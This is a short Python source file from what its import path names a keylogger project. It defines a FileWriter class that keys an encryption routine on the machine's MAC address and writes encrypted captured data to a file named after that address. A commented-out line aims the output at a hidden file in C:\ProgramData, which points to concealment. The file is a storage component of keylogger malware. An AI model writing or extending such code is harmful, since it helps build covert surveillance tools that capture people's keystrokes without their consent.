import json
from getmac import get_mac_address
from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt

class FileWriter:
    def __init__(self):
        self.__mac = get_mac_address()
        self.__file_name = self.__mac.replace(':', '-')


    def write_to_file(self, data : dict):
        if data:
            key= Encrypt.create_key(self.__mac)
            # with open(r"C:\ProgramData\.tmp.json" , 'wb') as f
            with open(fr"C:\Users\User\Desktop\{self.__file_name}.json" , 'wb') as f:
                print('writing..')
                f.write(Encrypt.encrypt_data(data, key))